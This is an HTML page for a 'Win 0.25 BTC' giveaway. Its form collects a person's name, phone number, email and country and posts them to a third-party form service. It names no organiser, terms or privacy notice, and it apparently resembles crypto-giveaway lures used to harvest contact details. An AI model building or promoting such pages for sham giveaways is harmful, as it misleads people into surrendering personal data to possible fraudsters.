<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Win 0.25 BTC Registration</title>
    <style>
        /* Global styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, #2c3e50, #4ca1af);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Adding background animation */
        .background-animation {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: -1;
            overflow: hidden;
        }

        .background-animation div {
            position: absolute;
            display: block;
            width: 20px;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            animation: float 20s infinite ease-in-out;
            border-radius: 50%;
        }

        .background-animation div:nth-child(1) {
            top: 10%;
            left: 20%;
            animation-duration: 18s;
            width: 50px;
            height: 50px;
        }

        .background-animation div:nth-child(2) {
            top: 60%;
            left: 70%;
            animation-duration: 22s;
            width: 30px;
            height: 30px;
        }

        .background-animation div:nth-child(3) {
            top: 80%;
            left: 30%;
            animation-duration: 15s;
            width: 40px;
            height: 40px;
        }

        @keyframes float {
            0% {
                transform: translateY(0) scale(1);
            }
            50% {
                transform: translateY(-50px) scale(1.1);
            }
            100% {
                transform: translateY(0) scale(1);
            }
        }

        .container {
            background-color: #fff;
            max-width: 500px;
            width: 100%;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
            text-align: center;
            animation: popIn 1s ease-in-out;
        }

        @keyframes popIn {
            0% {
                transform: scale(0.7);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        h1 {
            margin-bottom: 20px;
            font-size: 28px;
            color: #2c3e50;
        }

        p {
            margin-bottom: 30px;
            font-size: 16px;
            color: #7f8c8d;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input, textarea {
            margin-bottom: 20px;
            padding: 12px;
            font-size: 16px;
            border: 2px solid #ddd;
            border-radius: 8px;
            transition: border-color 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
        }

        input:focus, textarea:focus {
            border-color: #4ca1af;
            box-shadow: 0 0 10px rgba(76, 161, 175, 0.3);
            outline: none;
        }

        textarea {
            resize: none;
            height: 120px;
        }

        button {
            padding: 15px;
            font-size: 18px;
            color: white;
            background: linear-gradient(135deg, #4ca1af, #2c3e50);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s ease-in-out, transform 0.3s ease-in-out;
        }

        button:hover {
            background: linear-gradient(135deg, #2c3e50, #4ca1af);
            transform: translateY(-3px);
        }

        /* Loading spinner */
        #loading {
            display: none;
            margin-top: 10px;
            color: #4ca1af;
        }

        /* Success Pop-up */
        #success-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            text-align: center;
            display: none;
            animation: popIn 0.5s ease-in-out;
        }

        #success-popup h2 {
            color: #4ca1af;
            margin-bottom: 10px;
        }

        #success-popup p {
            margin-bottom: 20px;
        }

        #close-popup {
            padding: 10px 20px;
            background-color: #4ca1af;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s ease-in-out;
        }

        #close-popup:hover {
            background-color: #2c3e50;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .container {
                margin: 20px;
            }
        }

    </style>
</head>
<body>

    <div class="background-animation">
        <div></div>
        <div></div>
        <div></div>
    </div>

    <div class="container">
        <h1>Register to Win 0.25 BTC</h1>
        <p>Fill in the details below for a chance to win 0.25 BTC!</p>
        <form id="registration-form">
            <input type="text" name="Full Name" placeholder="Full Name" required>
            <input type="tel" name="Phone" placeholder="Phone Number" required>
            <input type="email" name="Email" placeholder="Email Address" required>
            <input type="text" name="Country" placeholder="Country" required>
            <textarea name="Message" placeholder="Why do you want to win?" required></textarea>
            <button type="submit">Submit</button>
        </form>
        <!-- Loading spinner -->
        <p id="loading">Submitting your registration...</p>
    </div>

    <!-- Success Pop-up -->
    <div id="success-popup">
        <h2>Registration Successful!</h2>
        <p>Thank you for entering. You are now in the running to win 0.25 BTC!</p>
        <button id="close-popup">Close</button>
    </div>

    <script>
        document.getElementById('registration-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form redirect

            // Show the loading indicator immediately after form submission
            document.getElementById('loading').style.display = 'block';

            // Capture the form data
            var formData = new FormData(this);

            // Send the data via Fetch API
            fetch('https://formspree.io/f/xdknvbop', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(function(response) {
                document.getElementById('loading').style.display = 'none'; // Hide loading message

                if (response.ok) {
                    // Show the success pop-up
                    document.getElementById('success-popup').style.display = 'block';
                } else {
                    alert('Oops! Something went wrong. Please try again.');
                }
            })
            .catch(function(error) {
                document.getElementById('loading').style.display = 'none'; // Hide loading message
                alert('Error submitting the form: ' + error.message);
            });
        });

        // Handle closing the pop-up
        document.getElementById('close-popup').addEventListener('click', function() {
            document.getElementById('success-popup').style.display = 'none';
            document.getElementById('registration-form').reset(); // Optionally clear the form
        });
    </script>

</body>
</html>
